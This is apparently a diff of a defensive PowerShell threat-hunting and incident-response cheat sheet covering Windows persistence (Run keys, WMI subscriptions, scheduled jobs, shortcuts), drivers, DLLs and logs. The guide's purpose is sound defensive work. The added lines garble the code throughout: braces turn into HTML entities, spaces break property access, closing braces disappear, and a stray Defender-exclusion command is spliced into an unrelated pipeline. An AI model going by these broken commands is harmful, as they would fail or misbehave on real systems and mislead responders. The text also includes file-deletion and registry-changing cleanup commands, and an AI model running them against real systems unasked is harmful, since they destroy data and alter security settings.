 HKEY_CURRENT_USER\Environment -UserInitMprLogonScript
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 #list all user's enviros
-(gp "HKU:\*\Environment").UserInitMprLogonScript
+(gp "HKU:\*\Environment"). UserInitMprLogonScript
 #Collect SID of target user with related logon task
 gp "HKU:\*\Environment" | FL PSParentPath,UserInitMprLogonScript
 # insert SID and convert it into username
-gwmi win32_useraccount | 
-select Name, SID | 
-? SID -match "" #insert SID between quotes 
+gwmi win32_useraccount |
+select Name, SID |
+? SID -match "" #insert SID between quotes
 You can remove this regsistry entry
 Programs at Powershell
 Adversaries can link their persistence mechanisms to a PowerShell profile, executing their malice
@@ -713,24 +700,23 @@ application
 For demo purposes, below we have Microsoft Edge that has been hijacked to execute calc on
 execution.
 (gci C:\Users\*\Documents\WindowsPowerShell\*profile.ps1, C:\Windows\System32\WindowsPowerShell\v1.
-Foreach-Object {
-  write-host "----$_---" -ForegroundColor Magenta ; 
+Foreach-Object &#123;
+  write-host "----$_---" -ForegroundColor Magenta ;
   gc $_ # | select-string -notmatch function ## if you want to grep out stuff you don't wanna see, uncomment
-}
 We can specifically query all Microsoft Edge's shortcuts to find this
-Get-CimInstance Win32_ShortcutFile | 
-? FileName -match 'edge' | 
+Get-CimInstance Win32_ShortcutFile |
+? FileName -match 'edge' |
 fl FileName,Name,Target, LastModified
 This doesn't scale however, as you will not know the specific shortcut that the adversary has
 manipulated. So instead, sort by the LastModified date
-Get-CimInstance Win32_ShortcutFile | 
-sort LastModified -desc | 
+Get-CimInstance Win32_ShortcutFile |
+sort LastModified -desc |
 fl FileName,Name,Target, LastModified
 Hunt LNKs at scale
 This above will output a LOT, however. You may want to only show results for anything
 LastModified after a certain date. Lets ask to only see things modified in the year 2022 onwards
 Get-CimInstance Win32_ShortcutFile |
-where-object {$_.lastmodified -gt [datetime]::parse("01/01/2022")} | 
+where-object &#123;$_.lastmodified -gt [datetime]::parse("01/01/2022")&#125; |
 sort LastModified -desc | fl FileName,Name,Target, LastModified
 Scheduled Jobs
 Surprisingly, not many people know about Scheduled Jobs. They're not anything too strange or
@@ -744,11 +730,11 @@ Get detail behind scheduled jobs
 Kill job
 The following all work.
 Disable-ScheduledJob -Name evil_sched
-Get-ScheduledJob | Get-JobTrigger | 
-Ft -Property @{Label="ScheduledJob";Expression={$_.JobDefinition.Name}},ID,Enabled, At, frequency, DaysOfWeek
+Get-ScheduledJob | Get-JobTrigger |
+Ft -Property @&#123;Label="ScheduledJob";Expression=&#123;$_. JobDefinition. Name&#125;&#125;,ID,Enabled, At, frequency, DaysOfWeek
 #pipe to fl or ft, whatever you like the look of more in the screenshot
 Unregister-ScheduledJob -Name eviler_sched
-Remove-Job -id 3 
+Remove-Job -id 3
 #then double check it's gone with Get-ScheduledJob
 #if persists, tack on to unregister or remove-job
 -Force -Confirm:$false -verbose
@@ -771,12 +757,12 @@ Now we've identified the evil WMI persistence, let us be rid of it!
 We can specify the Name as EVIL as that's what it was called across the three services.
 Whatever your persistence calls itself, change the name for that
 #notice this time, we use the abbrevated version of CIM and WMI
-gcim -Namespace root\Subscription -Class __EventFilter | 
+gcim -Namespace root\Subscription -Class __EventFilter |
 ? Name -eq "EVIL" | Remove-CimInstance -verbose
-gcim -Namespace root\Subscription -Class __EventConsumer| 
+gcim -Namespace root\Subscription -Class __EventConsumer|
 ? Name -eq "EVIL" | Remove-CimInstance -verbose
 #it's actually easier to use gwmi here instead of gcim
-gwmi -Namespace root\Subscription -Class __FilterToConsumerBinding | 
+gwmi -Namespace root\Subscription -Class __FilterToConsumerBinding |
 ? Consumer -match "EVIL" | Remove-WmiObject -verbose
 A note on CIM
 You may see WMI and CIM talked about together, whether on the internet or on in the Blue Team
@@ -796,26 +782,24 @@ If a RunOnce key has a name with an exclemation mark (!likethis) then it will se
 IF a RunOnce key has a name with an asterik (* LikeDIS) then it can run even in Safe
 Mode.
 If you look in the reg, you'll find some normal executables.
-
 Finding Run Evil
 A quick pwsh for loop can collect the contents of the four registry locations.
 You can also achieve the same thing with these two alternative commands, but it isn't as cool as
 the above for loop
-get-itemproperty "HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run*" | 
+get-itemproperty "HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run*" |
   select -property * -exclude PSPR*,PSD*,PSC*,PSPAR*  | fl
-get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run*" | 
+get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run*" |
   select -property * -exclude PSPR*,PSD*,PSC*,PSPAR*  | fl
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
-(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ).Pspath |
-Foreach-Object {
-  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
-  gp $_ | 
+(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ). Pspath |
+Foreach-Object &#123;
+  write-host "----Reg location is $_---" -ForegroundColor Magenta ;
+  gp $_ |
   select -property * -exclude PS*, One*, vm* | #exclude results here
   FL
-}
 #you can squish that all in one line if you need to
-(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ).Pspath | 
+(gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ). Pspath |
 Removing Run evil
 Be surgical here. You don't want to remove Run entries that are legitimate. It's important you
 remove with -verbose too and double-check it has gone, to make sure you have removed what
@@ -835,32 +819,30 @@ Svchost startup persistence
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 $folders = @("HKU:\*\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
-foreach ($folder in $folders) {
-  write-host "----Reg key is $folder--- -ForegroundColor Magenta "; 
-  get-itemproperty -path "$folder"  | 
+foreach ($folder in $folders) &#123;
+  write-host "----Reg key is $folder--- -ForegroundColor Magenta ";
+  get-itemproperty -path "$folder"  |
   select -property * -exclude PS* | fl
-}
 get-itemproperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
 Winlogon startup persistence
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
-(gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").PSPath | 
-Foreach-Object {
-  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
-  gp $_ | 
+(gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"). PSPath |
+Foreach-Object &#123;
+  write-host "----Reg location is $_---" -ForegroundColor Magenta ;
+  gp $_ |
   select -property * -exclude PS* |
   FL
-}
 Find more examples of Run key evil from Mitre ATT&CK
 Evidence of Run Key Execution
 You can query the 'Microsoft-Windows-Shell-Core/Operational' log to find evidence if a registry
 run key was successful in executing.
 Screensaver Persistence
-It can be done, I swear. Mitre ATT&CK has instances of .SCR's being used to maintain regular
+It can be done, I swear. Mitre ATT&CK has instances of . SCR's being used to maintain regular
 persistence
-get-winevent -filterhashtable @{ logname = "Microsoft-Windows-Shell-Core/Operational"
-select TimeCreated, Message, 
-@{Name="UserName";Expression = {$_.UserId.translate([System.Security.Principal.NTAccount]).value}}  | 
+get-winevent -filterhashtable @&#123; logname = "Microsoft-Windows-Shell-Core/Operational"
+select TimeCreated, Message,
+@&#123;Name="UserName";Expression = &#123;$_. UserId.translate([System. Security. Principal. NTAccount]).value&#125;&#125;  |
 sort TimeCreated -desc| fl
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
@@ -873,9 +855,9 @@ The group policy in an Windows can be leveraged and weaponised to propogate diag
 even ransomware across the entire domain
 You can query the changes made in the last X days with this line
 #collects the domain name as a variable to use later
-$domain = (Get-WmiObject -Class win32_computersystem).domain; 
-Get-GPO -All -Domain $domain | 
-?{ ([datetime]::today - ($_.ModificationTime)).Days -le 10 } | sort
+$domain = (Get-WmiObject -Class win32_computersystem).domain;
+Get-GPO -All -Domain $domain |
+?&#123; ([datetime]::today - ($_. ModificationTime)). Days -le 10 &#125; | sort
 # Change the digit after -le to the number of days you want to go back for
 Query GPO Scripts
 We can hunt down the strange thinngs we might see in our above query
@@ -886,7 +868,6 @@ gci -recurse \\$domain\\sysvol\$domain\Policies\ -file -include *.exe, *.ps1
 We can hunt down where GPO scripts live
 $domain = (Get-WmiObject -Class win32_computersystem).domain;
 gci -recurse \\$domain\\sysvol\*\scripts
-Autoruns
 Autoruns is a Sysinternals tool for Windows. It offers analysts a GUI method to examine the
 recurring tasks that an adversary might use for persistence and other scheduled malice.
 Before you go anywhere cowboy, make sure you've filtered out the known-goods under options.
@@ -917,34 +898,34 @@ You can chuck wildcards in directories for gci, as well as wildcard to include f
 Let's say we want to look in all of the Users \temp\ directories. We don't want to put their names
 in, so we wildcard it.
 We also might only be interested in the pwsh scripts in their \temp, so let's filter for those only
-gci "C:\Users\*\AppData\Local\Temp\*" -Recurse -Force -File  -Include *.ps1, *.psm1, *.txt | 
-ft lastwritetime, name -autosize | 
+gci "C:\Users\*\AppData\Local\Temp\*" -Recurse -Force -File  -Include *.ps1, *.psm1, *.txt |
+ft lastwritetime, name -autosize |
 out-string -width 800
 Check if a specific file or path is alive.
 I've found that this is a great one to quickly check for specific vulnerabilities. Take for example,
 CVE-2021-21551. The one below this one is an excellent way of utilising the 'true/false' binary
 results that test-path can give
-test-path -path "C:\windows\temp\DBUtil_2_3.Sys"
+test-path -path "C:\windows\temp\DBUtil_2_3. Sys"
 test if files and directories are present or absent
 This is great to just sanity check if things exist. Great when you're trying to check if files or
 directories have been left behind when you're cleaning stuff up.
-$a = Test-Path "C:\windows\sysmon.exe"; $b= Test-Path "C:\Windows\SysmonDrv.sys"; 
-IF ($a -eq 'True') {Write-Host "C:\windows\sysmon.exe present"} ELSE {Write-Host 
-IF ($b -eq 'True') {Write-Host "C:\Windows\SysmonDrv.sys present"} ELSE {Write-Host
-IF ($c -eq 'True') {Write-Host "C:\Program Files (x86)\sysmon present"} ELSE {Write-Host
-IF ($d -eq 'True') {Write-Host "C:\Program Files\sysmon present"} ELSE {Write-Host
+$a = Test-Path "C:\windows\sysmon.exe"; $b= Test-Path "C:\Windows\SysmonDrv.sys";
+IF ($a -eq 'True') &#123;Write-Host "C:\windows\sysmon.exe present"&#125; ELSE &#123;Write-Host
+IF ($b -eq 'True') &#123;Write-Host "C:\Windows\SysmonDrv.sys present"&#125; ELSE &#123;Write-Host
+IF ($c -eq 'True') &#123;Write-Host "C:\Program Files (x86)\sysmon present"&#125; ELSE &#123;Write-Host
+IF ($d -eq 'True') &#123;Write-Host "C:\Program Files\sysmon present"&#125; ELSE &#123;Write-Host
 ^ The above is a bit over-engineered. Here's an an abbrevated version
 We can also make this conditional. Let's say if Process MemeProcess is NOT running, we can
 then else it to go and check if files exist
 You can use test-path to query Registry, but even the 2007 Microsoft docs say that this can
 give inconsistent results, so I wouldn't bother with test-path for reg stuff when it's during an IR
 Query File Contents
-$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
-foreach ($Item in $Paths){if
-(test-path $Item) {write "$Item present"}else{write "$Item absent"}}
-$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
-if (Get-Process | where-object Processname -eq "explorer") {write "process working"
-foreach ($Item in $Paths){if (test-path $Item) {write "$Item present"}else{write 
+$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ;
+foreach ($Item in $Paths)&#123;if
+(test-path $Item) &#123;write "$Item present"&#125;else&#123;write "$Item absent"&#125;&#125;
+$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ;
+if (Get-Process | where-object Processname -eq "explorer") &#123;write "process working"
+foreach ($Item in $Paths)&#123;if (test-path $Item) &#123;write "$Item present"&#125;else&#123;write
 Seen a file you don't recognise? Find out some more about it! Remember though: don't trust
 timestamps!
 Alternate data streams
@@ -953,10 +934,10 @@ get-item evil.ps1 -stream "*" | where stream -ne ":$DATA"
 # If you see an option that isn't $DATA, hone in on it
 get-content evil.ps1 -steam "evil_stream"
 Read hex of file
-gc .\evil.ps1 -encoding byte | 
+gc .\evil.ps1 -encoding byte |
 Format-Hex
 Get-item C:\Temp\Computers.csv |
-select-object -property @{N='Owner';E={$_.GetAccessControl().Owner}}, *time, versioninfo | fl 
+select-object -property @&#123;N='Owner';E=&#123;$_. GetAccessControl(). Owner&#125;&#125;, *time, versioninfo | fl
 Recursively look for particular file types, and once you find the files get their
 hashes
 This one-liner was a godsend during the Microsoft Exchange ballache back in early 2021
@@ -974,14 +955,14 @@ Remove items written after x date
 And then you can recursively remove the files and directories, in case malicious
 $date = "31/01/2022"; $directory = "C:\Users\Frank\AppData\"
 get-childitem "$directory" -recurse|
-where-object {$_.lastwritetime -gt [datetime]::parse("$date")}|
+where-object &#123;$_.lastwritetime -gt [datetime]::parse("$date")&#125;|
 Sort-Object -property LastWriteTime | remove-item -confirm -whatif
 Remove the last -whatif flag to actaully detonate. Will ask you one at a time if you want to delete
 items. Please A to delete all
 $date = "12/01/2021"; $directory = "C:\temp"
 get-childitem "$directory" -recurse|
-where-object {$_.mode -notmatch "d"}| 
-where-object {$_.lastwritetime -gt [datetime]::parse("$date")}|
+where-object &#123;$_.mode -notmatch "d"&#125;|
+where-object &#123;$_.lastwritetime -gt [datetime]::parse("$date")&#125;|
 Sort-Object -property LastWriteTime | format-table lastwritetime, fullname -autosize
 copy multiple files to new location
 Grep in Powershell
@@ -990,12 +971,12 @@ things in unicode and then ascii.
 I like to use these as really lazy low-key yara rules. So grep for the string "educational purposes
 only" or something like that to catch malicious tooling - you'd be surprised how any vendors
 take open-source stuff, re-brand and compile it, and then sell it to you.....
-ls C:\Windows\System32\* -include '*.exe', '*.dll' | 
-select-string 'RunHTMLApplication' -Encoding unicode | 
+ls C:\Windows\System32\* -include '*.exe', '*.dll' |
+select-string 'RunHTMLApplication' -Encoding unicode |
 select-object -expandproperty path -unique
 #and with ascii
-ls C:\Windows\System32\* -include '*.exe', '*.dll' | 
-select-string 'RunHTMLApplication' -Encoding Ascii | 
+ls C:\Windows\System32\* -include '*.exe', '*.dll' |
+select-string 'RunHTMLApplication' -Encoding Ascii |
 select-object -expandproperty path -unique
 Registry Queries
 copy-item "C:\windows\System32\winevt\Logs\Security.evtx", "C:\windows\System32\winevt\Logs\Windows PowerShell.evtx"
@@ -1049,7 +1030,7 @@ If there's a malicious reg entry, you can remove it this way
 # can run this network-wide
 if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
 #remediate the malice with this
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d
 #Create HKU drive
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 # Read the reg to make sure this is the bad boy you want
@@ -1069,7 +1050,7 @@ To just generally convert them
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 #this
 HKCU:\Software\AppDataLow\Software\Microsoft\FDBC3F8C-385A-37D8-2A81-EC5BFE45E0BF
-#must become this. Notice the reg changes in the field field, and the SID gets sandwiched in
+#must become this. Notice the reg changes in the field, and the SID gets sandwiched in
 HKU:\S-1-5-21-912369493-653634481-1866108234-1004\Software\AppDataLow\Software\Microsoft\FDBC3F8C-
 Understanding Reg Permissions
 Reg permissions, and ACL and SDDL in general really, are a bit long to understand. But worth it,
@@ -1096,11 +1077,11 @@ Hunting for Reg evil
 Now we know how reg entries are compromised, how can we search?
 The below takes the services reg as an example, and searches for specifically just the reg-key
 $acl = Get-Acl -Path hklm:\System\CurrentControlSet\services\;
-ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl[0]};
-ConvertFrom-SddlString -Sddl $acl.Sddl -Type RegistryRights | Foreach-Object {$_.DiscretionaryAcl[
+ConvertFrom-SddlString -Sddl $acl. Sddl | Foreach-Object &#123;$_. DiscretionaryAcl[0]&#125;;
+ConvertFrom-SddlString -Sddl $acl. Sddl -Type RegistryRights | Foreach-Object &#123;$_. DiscretionaryAcl[
 # bottom one specifices the  registry access rights when you create RegistrySecurity objects
 #don't actually run this
-Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\example_service -name ImagePath -value 
+Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\example_service -name ImagePath -value
 Name and Image Path.
 Filtering Reg ImagePath
 Let's continue to use the \Services\ reg as our example.
@@ -1111,39 +1092,39 @@ I have to mention, don't write .sys files off as harmless. Rootkits and bootkits
 example.
 If you see a suspicious file in reg, you can go and collect it and investigate it, or collect it's hash.
 When it comes to the ImagePath, \SystemRoot\ is usually C:\Windows, but you can confirm with
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+ft PSChildName, ImagePath -autosize | out-string -width 800
 #You can search recursively with this, kind of, if you use wildcards in the path names. Will take longer if you do recursively search though
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\**\*" | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\**\*" |
+ft PSChildName, ImagePath -autosize | out-string -width 800
 # This one-liner is over-engineered. # But it's a other way to be recursive if you start from a higher directory in reg
 # will take a while though
 $keys = Get-ChildItem -Path "HKLM:\System\CurrentControlSet\" -recurse -force ;
-$Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath };
-ForEach ($Item in $Items) {"{0,-35} {1,-10} " -f $Item.PSChildName, $Item.ImagePath} 
+$Items = $Keys | Foreach-Object &#123;Get-ItemProperty $_. PsPath &#125;;
+ForEach ($Item in $Items) &#123;"&#123;0,-35&#125; &#123;1,-10&#125; " -f $Item. PSChildName, $Item. ImagePath&#125;
 $Env:systemroot .
 Query Background Activity Moderator
 BAM only in certain Windows 10 machines. Provides full path of the executabled last execution
 time
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\state\UserSettings" /s
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-where ImagePath -like "*.exe*" | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
-# if you notice, on line two we wrap .exe in TWO in wildcards. Why? 
-  # The first wildcard is to ensure we're kind of 'grepping' for a file that ends in a .exe. 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+where ImagePath -like "*.exe*" |
+ft PSChildName, ImagePath -autosize | out-string -width 800
+# if you notice, on line two we wrap .exe in TWO in wildcards. Why?
+  # The first wildcard is to ensure we're kind of 'grepping' for a file that ends in a .exe.
     # Without the first wildcard, we'd be looking for literal .exe
   # The second wildcard is to ensure we're looking for the things that come after the .exe
      # This is to make sure we aren't losing the flags and args of an executable
 # We can filter however we wish, so we can actively NOT look for .exes
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-where ImagePath -notlike "*.exe*" | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+where ImagePath -notlike "*.exe*" |
+ft PSChildName, ImagePath -autosize | out-string -width 800
 #fuck it, double stack your filters to not look for an exe or a sys...not sure why, but go for it!
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-? {($_.ImagePath -notlike "*.exe*" -and $_.Imagepath -notlike "*.sys*")} | 
-ft PSChildName, ImagePath -autosize | out-string -width 800 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+? &#123;($_. ImagePath -notlike "*.exe*" -and $_. Imagepath -notlike "*.sys*")&#125; |
+ft PSChildName, ImagePath -autosize | out-string -width 800
 #If you don't care about Reg Entry name, and just want the ImagePath
-(Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*").ImagePath  
+(Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*"). ImagePath
 # or HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\
 OR BAMParser.ps1
 Driver Queries
@@ -1156,7 +1137,7 @@ You can utilise Winbindex to investigate drivers, and compare a local copy you h
 indexed info. Malicious copies may have a hash that doesn't match, or a file size that doesn't
 quite match.
 Printer Drivers
-Get-PrinterDriver | fl Name, *path*, *file* 
+Get-PrinterDriver | fl Name, *path*, *file*
 System Drivers
 If drivers are or aren't signed, don't use that as the differentiation for what is legit and not legit.
 Some legitimate drivers are not signed ; some malicious drivers sneak a signature.
@@ -1165,44 +1146,42 @@ Get unsigned drivers. Likely to not return much
 Signed
 Get the signed ones. Will return a lot.
 gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
-Get-AuthenticodeSignature | 
+Get-AuthenticodeSignature |
 ? Status -ne "Valid" | ft -autosize
-gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
-Get-AuthenticodeSignature | 
+gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue |
+Get-AuthenticodeSignature |
 ? Status -ne "Valid" | ft -autosize
-Get-WmiObject Win32_PnPSignedDriver | 
+Get-WmiObject Win32_PnPSignedDriver |
 fl DeviceName, FriendlyName, DriverProviderName, Manufacturer, InfName, IsSigned, DriverVersion
 # alternatives
-gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
-Get-AuthenticodeSignature | 
-? Status -eq "Valid" | ft -autosize 
+gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue |
+Get-AuthenticodeSignature |
+? Status -eq "Valid" | ft -autosize
 #or
 gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
-Get-AuthenticodeSignature | 
-? Status -eq "Valid" | ft -autosize 
+Get-AuthenticodeSignature |
+? Status -eq "Valid" | ft -autosize
 Other Drivers
-Gets all 3rd party drivers
-Drivers by Registry
+Gets all 3rd party drivers by Registry
 You can also leverage the Registry to look at drivers
-Get-WindowsDriver -Online -All | 
-fl Driver, ProviderName, ClassName, ClassDescription, Date, OriginalFileName, DriverSignature 
+Get-WindowsDriver -Online -All |
+fl Driver, ProviderName, ClassName, ClassDescription, Date, OriginalFileName, DriverSignature
 #if you know the driver, you can just give the full path and wildcard the end if you aren't sure of full spelling
-get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\DBUtil*" 
+get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\DBUtil*"
 #You'll likely not know the path though, so just filter for drivers that have \drivers\ in their ImagePath
-get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\*"  | 
-? ImagePath -like "*drivers*" | 
+get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\*"  |
+? ImagePath -like "*drivers*" |
 fl ImagePath, DisplayName
-(
 Drivers by Time
-Look for the drivers that exist via directory diving.. We can focus on .INF and .SYS files, and sort
+Look for the drivers that exist via directory diving.. We can focus on . INF and . SYS files, and sort
 by the time last written.
 #change to LastWriteTimeUtc if you need to.
 # first directory location
-gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf | 
+gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf |
 sort-object LastWriteTime -Descending |
 ft FullName,LastWriteTime | out-string -width 850
 # second driver location
-gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
+gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue |
 sort-object LastWriteTime -Descending |
 ft FullName,LastWriteTime | out-string -width 850
 DLL Queries
@@ -1211,15 +1190,15 @@ DLLs Used in Processes
 We've already discussed how to show DLLs used in processes
 But what about getting granular. Well, let's pick on a specific process we can see running, and
 let's get the DLLs involved, their file location, their size, and if they have a company name
-get-process -name "google*" | 
-Fl @{l="Modules";e={$_.Modules | fl FileName, Size, Company | out-string}}
+get-process -name "google*" |
+Fl @&#123;l="Modules";e=&#123;$_. Modules | fl FileName, Size, Company | out-string&#125;&#125;
 #alterntive version, just print filepath of specific process' DLL
-(gps -name "google*").Modules.FileName
+(gps -name "google*"). Modules. FileName
 You can in theory run this without specifying a process, and it will just retrieve all of the DLLs
 involved in all the processes. But this will be LONG man.
 Investigate Process Dlls
 We can zero in on the DLLs that a process may call on
-(gps -name "google").Modules.FileName | Get-AuthenticodeSignature
+(gps -name "google"). Modules. FileName | Get-AuthenticodeSignature
 Investigate DLLs
 Generically
 This will return a lot of DLLs and their last write time. I personally would avoid this approach
@@ -1236,16 +1215,16 @@ You'll get a lot of results if you look for VALID, signed DLLs. So maybe filter 
 first. Both will take some time
 #get invalid
 gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
-Get-AuthenticodeSignature | ? Status -ne "Valid" 
+Get-AuthenticodeSignature | ? Status -ne "Valid"
 #collect valid ones with this command
 gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
-Get-AuthenticodeSignature | ? Status -eq "Valid" 
+Get-AuthenticodeSignature | ? Status -eq "Valid"
 Specifically
 We can apply all of the above to individual DLLs. If I notice something strange during the
 process' DLL hunt, or if I had identified a DLL with an invalid signature. I'd then hone in on that
 specific DLL.
 gci -path C:\Windows\twain_32.dll | get-filehash
-gci -path C:\Windows\twain_32.dll | Get-AuthenticodeSignature 
+gci -path C:\Windows\twain_32.dll | Get-AuthenticodeSignature
 Verify
 If you need to verify what a DLL is, you have a myriad of ways. One way is through Winbindex
 Here, you can put the name of a DLL (or many of other filetypes), and in return get a whole
@@ -1268,7 +1247,6 @@ Get-MpThreatDetection | Format-List threatID, *time, ActionSuccess
 Get-MpThreat -ThreatID
 Trigger Defender Scan
 Update-MpSignature; Start-MpScan
-
 #or full scan
 Start-MpScan -ScanType FullScan
 #Specify path
@@ -1296,22 +1274,22 @@ related stuff.
 Show Logs
 Show logs that are actually enabled and whose contents isn't empty.
 Get-WinEvent -ListLog *|
-where-object {$_.IsEnabled -eq "True" -and $_.RecordCount -gt "0"} | 
+where-object &#123;$_. IsEnabled -eq "True" -and $_. RecordCount -gt "0"&#125; |
 Remove-MpPreference -ExclusionProcess 'velociraptor' -ExclusionPath 'C:\Users\IEUser\Pictures'
-sort-object -property LogName | 
+sort-object -property LogName |
 format-table LogName -autosize -wrap
 Overview of what a specific log is up to
 Specifically get the last time a log was written to
-Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational | Format-List -Property * 
-(Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime 
+Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational | Format-List -Property *
+(Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime
 Compare the date and time a log was last written to
 Checks if the date was written recently, and if so, just print sysmon working if not recent, then
 print the date last written. I've found sometimes that sometimes sysmon bugs out on a machine,
 and stops committing to logs. Change the number after -ge to be more flexible than the one
 day it currently compares to
-$b = (Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime; 
-$a = Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational| where-object {(new-timespan
-if ($a -eq $null){Write-host "sysmon_working"} else {Write-host "$env:computername
+$b = (Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime;
+$a = Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational| where-object &#123;(new-timespan
+if ($a -eq $null)&#123;Write-host "sysmon_working"&#125; else &#123;Write-host "$env:computername
 Read a Log File
 Again, trusting the logs of an endpoint is a dangerous game. An adversary can evade endpoint
 logging. It's better to utilise logs that have been taken to a central point, to trust EVENT IDs from
@@ -1337,16 +1315,16 @@ If you wanted to query this network wide, you've got some options:
 #Show usage log's created after a certain day
   #use american date, probably a way to convert it but meh
 gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*",
-"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*" | 
-where-object {$_.LastWriteTime -gt [datetime]::parse("11/22/2022")} | 
+"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*" |
+where-object &#123;$_. LastWriteTime -gt [datetime]::parse("11/22/2022")&#125; |
 ? Name -notmatch Powershell #can ignore and filter some names
-# Show usage log but split to focus on the username, executable, and machine name in case you run this network-wide via something like Velociraptor 
-(gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*").fullname | 
-ForEach-Object{$data = $_.split("\\");write-output "$($data[8]), $($data[2]), $(hostname)"
+# Show usage log but split to focus on the username, executable, and machine name in case you run this network-wide via something like Velociraptor
+(gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*").fullname |
+ForEach-Object&#123;$data = $_.split("\\");write-output "$($data[8]), $($data[2]), $(hostname)"
 Select-String -notmatch "powershell", "NGenTask","sdiagnhost"
